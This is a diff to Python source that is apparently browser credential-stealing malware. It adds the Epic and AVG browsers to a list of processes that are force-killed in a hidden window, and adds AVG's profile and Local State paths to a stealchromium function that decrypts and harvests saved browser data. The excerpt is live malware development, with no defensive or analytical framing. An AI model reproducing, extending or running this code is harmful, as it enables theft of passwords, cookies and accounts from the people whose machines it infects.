@@ -58,7 +58,7 @@ def load_nss(profile_path, nss3):
             return nss
 
 def kill():
-    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'iridium.exe', 'vivaldi.exe', 'chrome.exe', 'amigo.exe', 'comet.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'iridium.exe', 'vivaldi.exe', 'chrome.exe', 'amigo.exe', 'epic.exe', 'comet.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
 
     for exe in exes:
         subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -199,6 +199,7 @@ def stealchromium():
         'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
         'Chrome Dev': {'path': localappdata + '\\Google\\Chrome Dev\\User Data', 'localstate': localappdata + '\\Google\\Chrome Dev\\User Data\\Local State'},
         'Chrome Beta': {'path': localappdata + '\\Google\\Chrome Beta\\User Data', 'localstate': localappdata + '\\Google\\Chrome Beta\\User Data\\Local State'},
+        'AVG': {'path': localappdata + '\\AVG\\Browser\\User Data', 'localstate': localappdata + '\\AVG\\Browser\\User Data\\Local State'},
         'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
         'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
         'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
